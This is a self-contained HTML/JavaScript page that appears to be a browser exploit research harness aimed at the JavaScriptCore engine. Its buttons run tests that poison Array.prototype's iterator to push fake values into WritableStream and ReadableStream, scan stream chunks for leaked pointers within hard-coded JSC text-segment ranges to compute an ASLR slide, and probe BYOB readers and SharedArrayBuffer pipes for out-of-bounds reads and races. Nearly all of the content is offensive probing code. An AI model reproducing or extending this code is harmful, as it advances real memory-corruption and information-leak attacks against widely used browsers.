<!doctype html><html><head>
<meta charset=utf8>
<meta name=viewport content="width=device-width,initial-scale=1">
<style>
body{background:#0c0c0c;color:#e4e4e4;font-family:monospace;font-size:12px;padding:14px}
.btns{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap}
button{background:#ff453a;color:#fff;border:none;padding:9px 16px;border-radius:5px;font-size:12px;cursor:pointer}
button.s{background:#222;border:1px solid #333}
button.cp{background:#32d74b;color:#000}
button:active{opacity:.7}
#o{background:#161616;border:1px solid #2a2a2a;border-radius:6px;padding:12px;min-height:420px;max-height:560px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.8}
.g{color:#32d74b}.r{color:#ff453a}.a{color:#ff9f0a}.d{color:#555}
#slide{background:#1a0000;border:2px solid #ff453a;border-radius:6px;padding:10px;margin-bottom:10px;display:none;color:#ff453a;font-weight:bold;font-size:12px}
#copymsg{color:#32d74b;font-size:11px;margin-left:4px;display:none}
</style></head><body>
<div class="btns">
  <button onclick="runAll()">▶ Run All</button>
  <button class="s" onclick="runProbe()">🔍 Probe Iterator</button>
  <button class="s" onclick="runCorrupt()">💀 Corrupt Attempt</button>
  <button class="s" onclick="runEscalate()">🚀 Escalate</button>
  <button class="cp" onclick="copyLog()">📋 Copy</button>
  <button class="s" onclick="clearLog()">🗑</button>
  <span id="copymsg">Copied!</span>
</div>
<div id="slide"></div>
<div id="o"></div>
<script>
var JSC_LO=0x180000000,JSC_HI=0x30000000000;
var JSC_TLO=0x198ce6000,JSC_THI=0x1b37db000;
var pb=new ArrayBuffer(8),pf=new Float64Array(pb),pu=new Uint32Array(pb);

function w(s,c){
  var d=document.getElementById('o'),e=document.createElement('span');
  if(c)e.className=c;
  e.textContent=new Date().toTimeString().slice(0,8)+' '+s+'\n';
  d.appendChild(e);d.scrollTop=d.scrollHeight;
}
function ok(s){w('[+] '+s,'g')}
function info(s){w('[*] '+s,'d')}
function warn(s){w('[~] '+s,'a')}
function hit(s){
  w('[!!!] '+s,'r');
  var sl=document.getElementById('slide');
  sl.style.display='block';sl.textContent+='★ '+s+'\n';
}
function clearLog(){
  document.getElementById('o').innerHTML='';
  document.getElementById('slide').style.display='none';
  document.getElementById('slide').textContent='';
}
function copyLog(){
  var text=document.getElementById('o').textContent;
  navigator.clipboard.writeText(text).then(function(){
    var m=document.getElementById('copymsg');m.style.display='inline';
    setTimeout(function(){m.style.display='none';},2000);
  }).catch(function(){
    var ta=document.createElement('textarea');ta.value=text;
    ta.style.cssText='position:fixed;left:-9999px';
    document.body.appendChild(ta);ta.select();document.execCommand('copy');
    document.body.removeChild(ta);
    var m=document.getElementById('copymsg');m.style.display='inline';
    setTimeout(function(){m.style.display='none';},2000);
  });
}
function chk(val,lbl){
  if(typeof val!=='number'||isNaN(val)||!isFinite(val)) return false;
  pf[0]=val;
  var lo=pu[0],hi=pu[1],approx=hi*4294967296+lo;
  if(approx>=JSC_LO&&approx<=JSC_HI){
    hit('PTR ('+lbl+'): 0x'+approx.toString(16));
    if(approx>=JSC_TLO&&approx<=JSC_THI) hit('JSC TEXT! slide~0x'+(approx-JSC_TLO).toString(16));
    return true;
  }
  return false;
}

var orig=Array.prototype[Symbol.iterator];

// =====================================================
// T1: VERIFY — Is the iterator actually called?
// If iterator IS called + fake values processed = real bug
// If iterator NOT called = just constructor ran normally
// =====================================================
async function runProbe(){
  w('\n=== Iterator Call Probe ===\n','g');
  info('Verifying iterator IS called during WS/RS construction');

  // P1: Count iterator calls per constructor
  var callCount=0;
  var callLog=[];

  Array.prototype[Symbol.iterator]=function(){
    callCount++;
    var context=new Error().stack.split('\n')[2]||'';
    callLog.push('call#'+callCount+' ctx:'+context.trim().slice(0,60));
    return orig.call(this);
  };

  callCount=0;callLog=[];
  try{new WritableStream();}catch(e){}
  info('WritableStream(): iterator called '+callCount+' times');
  for(var i=0;i<callLog.length;i++) info('  '+callLog[i]);

  callCount=0;callLog=[];
  try{new ReadableStream();}catch(e){}
  info('ReadableStream(): iterator called '+callCount+' times');
  for(var i=0;i<callLog.length;i++) info('  '+callLog[i]);

  callCount=0;callLog=[];
  try{new TransformStream();}catch(e){}
  info('TransformStream(): iterator called '+callCount+' times');

  Array.prototype[Symbol.iterator]=orig;

  // P2: Detect if WritableStream USES iterator values
  info('\nP2: Does WritableStream USE the iterated values?');
  var fakeCalled=false;
  var fakeVal={IS_FAKE:true,fake_id:0xDEAD};

  Array.prototype[Symbol.iterator]=function(){
    var arr=this;
    var realIter=orig.call(arr);
    var idx=0;
    return{next:function(){
      var real=realIter.next();
      if(!real.done&&idx===0){
        fakeCalled=true;
        idx++;
        // Return fake for first element
        return{value:fakeVal,done:false};
      }
      idx++;
      return real;
    }};
  };

  fakeCalled=false;
  try{
    var ws=new WritableStream({
      start:function(ctrl){
        info('WS.start called: ctrl type='+typeof ctrl);
      },
      write:function(chunk){
        info('WS.write: chunk type='+typeof chunk);
        if(chunk&&chunk.IS_FAKE) hit('WS processed FAKE chunk from iterator!');
      }
    });
    info('WritableStream created, fakeCalled='+fakeCalled);
    // Try to write and see if fake value shows up
    var writer=ws.getWriter();
    writer.write([1,2,3]).catch(function(){});
    await new Promise(function(r){setTimeout(r,100);});
  }catch(e){info('WS probe: '+e.name);}

  Array.prototype[Symbol.iterator]=orig;

  // P3: ReadableStream iterator detection
  info('\nP3: Does ReadableStream USE the iterated values?');
  var rsIterCalled=false;
  Array.prototype[Symbol.iterator]=function(){
    rsIterCalled=true;
    var stack=new Error().stack;
    info('RS iterator called from: '+stack.split('\n')[2].trim().slice(0,80));
    return orig.call(this);
  };

  try{
    var rs=new ReadableStream({
      start:function(ctrl){
        info('RS.start called');
        ctrl.enqueue([10,20,30]);
        ctrl.close();
      }
    });
    var reader=rs.getReader();
    var chunk=await reader.read();
    info('RS chunk: '+JSON.stringify(chunk.value)+' iterCalled='+rsIterCalled);
    // If the chunk was iterated, rsIterCalled = true
    if(rsIterCalled) warn('RS iterator WAS called during enqueue/read!');
    else info('RS iterator was NOT called (expected)');
  }catch(e){info('RS probe: '+e.name);}

  Array.prototype[Symbol.iterator]=orig;
  ok('Probe done');
  await new Promise(function(r){setTimeout(r,50);});
}

// =====================================================
// T2: Attempt to actually corrupt via WS/RS iterator
// Try to get type confusion into processed data
// =====================================================
async function runCorrupt(){
  w('\n=== WritableStream/ReadableStream Corruption Attempt ===\n','g');

  // C1: WritableStream with fake queuingStrategy via iterator
  info('C1: WritableStream queuingStrategy via poisoned iterator...');

  // WritableStream(underlyingSink, {size: fn, highWaterMark: N})
  // size fn is called on each chunk — if we can replace it via iterator...
  var sizeCalls=0;
  var sizeArgs=[];

  Array.prototype[Symbol.iterator]=function(){
    var arr=this;
    var i=0;
    var realIter=orig.call(arr);
    return{next:function(){
      var real=realIter.next();
      if(real.done) return real;
      var val=real.value;
      // Intercept — return evil queuingStrategy object
      if(i===0&&typeof val==='object'&&val!==null&&'highWaterMark' in val){
        val={
          size:function(chunk){
            sizeCalls++;
            sizeArgs.push(chunk);
            // Return a ptr-sized number
            return 0x198ce6001; // near JSC __TEXT base
          },
          highWaterMark:1
        };
        warn('Substituted queuingStrategy via iterator at idx '+i);
      }
      i++;
      return{value:val,done:false};
    }};
  };

  try{
    var ws2=new WritableStream(
      {write:function(chunk){info('ws2.write: '+chunk.length+' bytes');}},
      {size:function(c){return 1;},highWaterMark:16}
    );
    var wr2=ws2.getWriter();
    await wr2.write(new Uint8Array(8).fill(0x41));
    info('C1 sizeCalls='+sizeCalls+' sizeArgs='+sizeArgs.length);
    if(sizeCalls>0) warn('Size function called! arg types: '+sizeArgs.map(function(a){return typeof a;}).join(', '));
    await wr2.close();
  }catch(e){info('C1: '+e.name+': '+e.message.slice(0,50));}

  Array.prototype[Symbol.iterator]=orig;

  // C2: ReadableStream pull via iterator confusion
  info('C2: ReadableStream pull controller type confusion...');
  var pullCount=0;
  var pullTypes=[];

  Array.prototype[Symbol.iterator]=function(){
    var arr=this;
    var i=0;
    var realIter=orig.call(arr);
    return{next:function(){
      var real=realIter.next();
      if(real.done) return real;
      var val=real.value;
      // Try to replace controller object
      if(i===0&&val&&typeof val.enqueue==='function'){
        warn('Intercepted RS controller via iterator!');
        var origEnqueue=val.enqueue.bind(val);
        val={
          enqueue:function(chunk){
            hit('Evil enqueue called with: '+typeof chunk);
            return origEnqueue(chunk);
          },
          close:val.close.bind(val),
          error:val.error.bind(val),
          desiredSize:val.desiredSize
        };
      }
      i++;
      return{value:val,done:false};
    }};
  };

  try{
    var rs2=new ReadableStream({
      start:function(ctrl){
        pullCount++;
        pullTypes.push(typeof ctrl);
        ctrl.enqueue(new Uint8Array(4).fill(0x42));
        ctrl.close();
      }
    });
    var rd2=rs2.getReader();
    var c2=await rd2.read();
    info('C2: got chunk, pullTypes='+pullTypes.join(','));
  }catch(e){info('C2: '+e.name);}

  Array.prototype[Symbol.iterator]=orig;

  // C3: from() constructor — ReadableStream.from() uses iterator!
  info('C3: ReadableStream.from() with evil async iterator...');
  if(typeof ReadableStream.from==='function'){
    var leaked=[];
    try{
      var evilIter={
        [Symbol.asyncIterator]:function(){
          var i=0;
          return{next:async function(){
            if(i>=5) return{done:true};
            // Yield giant/ptr-shaped values
            var val=i===2?new ArrayBuffer(65536):new Uint8Array(8).fill(0x41+i);
            i++;
            return{value:val,done:false};
          }};
        }
      };
      var rs3=ReadableStream.from(evilIter);
      var rd3=rs3.getReader();
      for(var ri=0;ri<6;ri++){
        var c3=await rd3.read();
        if(c3.done) break;
        if(c3.value instanceof ArrayBuffer){
          warn('Got ArrayBuffer chunk: '+c3.value.byteLength+' bytes');
          var u32=new Uint32Array(c3.value);
          for(var ui=0;ui<u32.length-1;ui+=2){
            var approx=u32[ui+1]*4294967296+u32[ui];
            if(approx>=JSC_LO&&approx<=JSC_HI) hit('from() chunk leaked ptr at ['+ui+']');
          }
          leaked.push(c3.value.byteLength);
        } else {
          info('from() chunk['+ri+']: '+c3.value.length+' bytes');
        }
      }
      ok('ReadableStream.from(): '+leaked.length+' ArrayBuffer chunks');
    }catch(e){info('C3: '+e.name);}
  } else {
    info('ReadableStream.from() not available');
  }

  ok('Corruption attempts done');
  await new Promise(function(r){setTimeout(r,50);});
}

// =====================================================
// T3: Escalate — if iterator IS being used by WS/RS
// try to get a measurable type confusion
// =====================================================
async function runEscalate(){
  w('\n=== Escalation Attempt ===\n','g');

  // E1: Structured clone via stream — does it preserve type?
  info('E1: postMessage/structuredClone with stream data...');
  try{
    var buf=new ArrayBuffer(64);
    new Uint32Array(buf).fill(0x41414141);

    var rs4=new ReadableStream({
      start:function(c){c.enqueue(buf);c.close();}
    });

    // structuredClone of buf
    var cloned=structuredClone(buf);
    var u32c=new Uint32Array(cloned);
    info('Cloned buf[0]: 0x'+u32c[0].toString(16));
    for(var ci=0;ci<u32c.length-1;ci+=2){
      var approx=u32c[ci+1]*4294967296+u32c[ci];
      if(approx>=JSC_LO&&approx<=JSC_HI) hit('structuredClone leaked ptr!');
    }

    var rd4=rs4.getReader();
    var ch4=await rd4.read();
    if(ch4.value instanceof ArrayBuffer){
      var u32d=new Uint32Array(ch4.value);
      for(var di=0;di<u32d.length-1;di+=2){
        var approx2=u32d[di+1]*4294967296+u32d[di];
        if(approx2>=JSC_LO&&approx2<=JSC_HI) hit('Stream chunk leaked ptr!');
      }
      ok('Stream chunk: '+ch4.value.byteLength+' bytes, clean');
    }
  }catch(e){info('E1: '+e.name);}

  // E2: BYOB reader with WritableStream
  info('E2: BYOB reader type confusion...');
  try{
    var rs5=new ReadableStream({
      type:'bytes',
      start:function(c){
        // Fill with known pattern
        var view=new Uint8Array(256);
        for(var i=0;i<256;i++) view[i]=i;
        c.enqueue(view);
        c.close();
      }
    });

    var rd5=rs5.getReader({mode:'byob'});
    var destBuf=new Uint8Array(256);
    var result=await rd5.read(destBuf);
    info('BYOB read: '+result.value.length+' bytes');

    var u32e=new Uint32Array(result.value.buffer);
    for(var ei=0;ei<u32e.length-1;ei+=2){
      var approx3=u32e[ei+1]*4294967296+u32e[ei];
      if(approx3>=JSC_LO&&approx3<=JSC_HI) hit('BYOB read leaked ptr at ['+ei+']!');
    }

    // Try to get OOB via BYOB with too-small buffer
    var smallBuf=new Uint8Array(4);
    try{
      var rs6=new ReadableStream({
        type:'bytes',
        start:function(c){
          var big=new Uint8Array(256);
          for(var i=0;i<256;i++) big[i]=0xAB;
          c.enqueue(big);c.close();
        }
      });
      var rd6=rs6.getReader({mode:'byob'});
      var res6=await rd6.read(smallBuf);
      info('BYOB small buf read: '+res6.value.length+' bytes (buf was 4)');
      if(res6.value.length>4) hit('BYOB OOB: read '+res6.value.length+' into 4-byte buffer!');
    }catch(e){info('BYOB small: '+e.name);}

  }catch(e){info('E2: '+e.name);}

  // E3: Transfer WritableStream via structuredClone
  info('E3: structuredClone WritableStream...');
  try{
    var ws3=new WritableStream({write:function(c){info('ws3 write: '+c);}});
    var clonedWS=structuredClone(ws3,{transfer:[ws3]});
    info('Cloned WritableStream: locked='+ws3.locked);
    hit('WritableStream structuredClone succeeded — transferred!');
    var writer3=clonedWS.getWriter();
    writer3.write(new Uint8Array(8).fill(0xCC));
    await writer3.close();
  }catch(e){info('E3 WS clone: '+e.name);}

  // E4: Multiple concurrent pipeThrough to same writable
  info('E4: Multiple readers/writers race...');
  try{
    var sharedBuf=new SharedArrayBuffer(1024);
    var sharedView=new Uint32Array(sharedBuf);
    sharedView.fill(0xDEADBEEF);

    // Create two streams writing to same underlying buffer
    var ws4=new WritableStream({
      write:function(chunk){
        var u32=new Uint32Array(chunk.buffer||new ArrayBuffer(0));
        for(var i=0;i<u32.length-1;i+=2){
          var approx=u32[i+1]*4294967296+u32[i];
          if(approx>=JSC_LO&&approx<=JSC_HI) hit('WritableStream chunk has ptr!');
        }
      }
    });

    var rs7=new ReadableStream({
      start:function(c){
        // Enqueue SharedArrayBuffer view
        c.enqueue(new Uint8Array(sharedBuf,0,256));
        c.enqueue(new Uint8Array(sharedBuf,256,256));
        c.close();
      }
    });

    await rs7.pipeTo(ws4);
    ok('E4 pipeTo completed');
  }catch(e){info('E4: '+e.name);}

  ok('Escalation done. Check Analytics.');
}

async function runAll(){
  clearLog();
  w('=== WritableStream/ReadableStream Iterator Confusion ===\n','g');
  w('[!!!] Both accepted poisoned Array iterator — verifying now\n','r');
  await runProbe();
  await runCorrupt();
  await runEscalate();
  w('\nDone. Check Analytics.\n','g');
}
</script>
